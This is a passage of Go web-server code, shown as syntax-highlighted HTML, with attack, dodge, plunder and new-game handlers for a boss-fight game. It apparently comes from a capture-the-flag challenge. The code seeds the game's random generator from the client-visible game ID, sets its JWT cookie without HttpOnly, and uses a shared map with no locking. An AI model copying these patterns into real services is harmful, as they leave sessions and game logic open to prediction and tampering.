</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">186</span><span class="">	game_id </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">claims</span><span class="token punctuation">[</span><span class="token string">&quot;game_id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">float64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">187</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">188</span><span class="">	gameState </span><span class="token operator">:=</span><span class=""> gameStates</span><span class="token punctuation">[</span><span class="">game_id</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">189</span><span class="">	</span><span class="token keyword">if</span><span class=""> gameState </span><span class="token operator">==</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">190</span><span class="">		w</span><span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="">http</span><span class="token punctuation">.</span><span class="">StatusNotFound</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">191</span><span class="">		json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;message&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;Game not found&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">192</span><span class="">		</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">193</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">194</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">195</span><span class="">	success</span><span class="token punctuation">,</span><span class=""> amount </span><span class="token operator">:=</span><span class=""> gameState</span><span class="token punctuation">.</span><span class="token function">PlayerAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">196</span><span class="">	</span><span class="token keyword">if</span><span class=""> </span><span class="token operator">!</span><span class="">success </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">197</span><span class="">		w</span><span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="">http</span><span class="token punctuation">.</span><span class="">StatusInternalServerError</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">198</span><span class="">		json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;message&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;You can&#x27;t attack right now&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">199</span><span class="">		</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">200</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">201</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">202</span><span class="">	json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;success&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;amount&quot;</span><span class="token punctuation">:</span><span class=""> amount</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">203</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">204</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">205</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">s </span><span class="token operator">*</span><span class="">Server</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">DodgeHandler</span><span class="token punctuation">(</span><span class="">w http</span><span class="token punctuation">.</span><span class="">ResponseWriter</span><span class="token punctuation">,</span><span class=""> r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">206</span><span class="">	</span><span class="token boolean">_</span><span class="token punctuation">,</span><span class=""> claims</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">_</span><span class=""> </span><span class="token operator">:=</span><span class=""> jwtauth</span><span class="token punctuation">.</span><span class="token function">FromContext</span><span class="token punctuation">(</span><span class="">r</span><span class="token punctuation">.</span><span class="token function">Context</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">207</span><span class="">	game_id </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">claims</span><span class="token punctuation">[</span><span class="token string">&quot;game_id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">float64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">208</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">209</span><span class="">	gameState </span><span class="token operator">:=</span><span class=""> gameStates</span><span class="token punctuation">[</span><span class="">game_id</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">210</span><span class="">	</span><span class="token keyword">if</span><span class=""> gameState </span><span class="token operator">==</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">211</span><span class="">		w</span><span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="">http</span><span class="token punctuation">.</span><span class="">StatusNotFound</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">212</span><span class="">		json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;message&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;Game not found&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">213</span><span class="">		</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">214</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">215</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">216</span><span class="">	gameState</span><span class="token punctuation">.</span><span class="token function">PlayerDodge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">217</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">218</span><span class="">	json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;success&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">219</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">220</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">221</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">s </span><span class="token operator">*</span><span class="">Server</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">PlunderHandler</span><span class="token punctuation">(</span><span class="">w http</span><span class="token punctuation">.</span><span class="">ResponseWriter</span><span class="token punctuation">,</span><span class=""> r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">222</span><span class="">	</span><span class="token boolean">_</span><span class="token punctuation">,</span><span class=""> claims</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">_</span><span class=""> </span><span class="token operator">:=</span><span class=""> jwtauth</span><span class="token punctuation">.</span><span class="token function">FromContext</span><span class="token punctuation">(</span><span class="">r</span><span class="token punctuation">.</span><span class="token function">Context</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">223</span><span class="">	game_id </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">claims</span><span class="token punctuation">[</span><span class="token string">&quot;game_id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">float64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">224</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">225</span><span class="">	gameState </span><span class="token operator">:=</span><span class=""> gameStates</span><span class="token punctuation">[</span><span class="">game_id</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">226</span><span class="">	</span><span class="token keyword">if</span><span class=""> gameState </span><span class="token operator">==</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">227</span><span class="">		w</span><span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="">http</span><span class="token punctuation">.</span><span class="">StatusNotFound</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">228</span><span class="">		json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;message&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;Game not found&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">229</span><span class="">		</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">230</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">231</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">232</span><span class="">	success</span><span class="token punctuation">,</span><span class=""> amount </span><span class="token operator">:=</span><span class=""> gameState</span><span class="token punctuation">.</span><span class="token function">PlayerPlunder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">233</span><span class="">	</span><span class="token keyword">if</span><span class=""> </span><span class="token operator">!</span><span class="">success </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">234</span><span class="">		w</span><span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="">http</span><span class="token punctuation">.</span><span class="">StatusInternalServerError</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">235</span><span class="">		json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;message&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;You can&#x27;t plunder right now&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">236</span><span class="">		</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">237</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">238</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">239</span><span class="">	json</span><span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">240</span><span class="">		</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;success&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">241</span><span class="">		</span><span class="token string">&quot;amount&quot;</span><span class="token punctuation">:</span><span class=""> amount</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">242</span><span class="">		</span><span class="token string">&quot;total&quot;</span><span class="token punctuation">:</span><span class="">  gameState</span><span class="token punctuation">.</span><span class="">plundered</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">243</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">244</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">245</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">246</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">s </span><span class="token operator">*</span><span class="">Server</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">NewGameHandler</span><span class="token punctuation">(</span><span class="">w http</span><span class="token punctuation">.</span><span class="">ResponseWriter</span><span class="token punctuation">,</span><span class=""> r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">247</span><span class="">	gameId </span><span class="token operator">:=</span><span class=""> rand</span><span class="token punctuation">.</span><span class="token function">Int32</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">248</span><span class="">	</span><span class="token boolean">_</span><span class="token punctuation">,</span><span class=""> tokenString</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">_</span><span class=""> </span><span class="token operator">:=</span><span class=""> TokenAuth</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;game_id&quot;</span><span class="token punctuation">:</span><span class=""> gameId</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">249</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">250</span><span class="">	gameStates</span><span class="token punctuation">[</span><span class="">gameId</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token operator">&amp;</span><span class="">GameState</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">251</span><span class="">		id</span><span class="token punctuation">:</span><span class="">           gameId</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">252</span><span class="">		bossHealth</span><span class="token punctuation">:</span><span class="">   MaxBossHealth</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">253</span><span class="">		playerHealth</span><span class="token punctuation">:</span><span class=""> </span><span class="token number">100</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">254</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">255</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">256</span><span class="">	cookie </span><span class="token operator">:=</span><span class=""> http</span><span class="token punctuation">.</span><span class="">Cookie</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">257</span><span class="">		Name</span><span class="token punctuation">:</span><span class="">     </span><span class="token string">&quot;jwt&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">258</span><span class="">		Value</span><span class="token punctuation">:</span><span class="">    tokenString</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">259</span><span class="">		HttpOnly</span><span class="token punctuation">:</span><span class=""> </span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">260</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">261</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">262</span><span class="">	http</span><span class="token punctuation">.</span><span class="token function">SetCookie</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">,</span><span class=""> </span><span class="token operator">&amp;</span><span class="">cookie</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">263</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">264</span><span class="">	</span><span class="token keyword">go</span><span class=""> </span><span class="token function">gameRunner</span><span class="token punctuation">(</span><span class="">gameId</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">265</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">266</span><span class="">	http</span><span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">,</span><span class=""> r</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;/play&quot;</span><span class="token punctuation">,</span><span class=""> http</span><span class="token punctuation">.</span><span class="">StatusTemporaryRedirect</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">267</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">268</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">269</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">gameRunner</span><span class="token punctuation">(</span><span class="">gameId </span><span class="token builtin">int32</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">270</span><span class="">	s2 </span><span class="token operator">:=</span><span class=""> rand</span><span class="token punctuation">.</span><span class="token function">NewPCG</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="">gameId</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1024</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">271</span><span class="">	r2 </span><span class="token operator">:=</span><span class=""> rand</span><span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="">s2</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">272</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">273</span><span class="">	</span><span class="token keyword">go</span><span class=""> </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">274</span><span class="">		time</span><span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">60</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Second</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">275</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">276</span><span class="">		gameState </span><span class="token operator">:=</span><span class=""> gameStates</span><span class="token punctuation">[</span><span class="">gameId</span><span class="token punctuation">]</span><span class="">
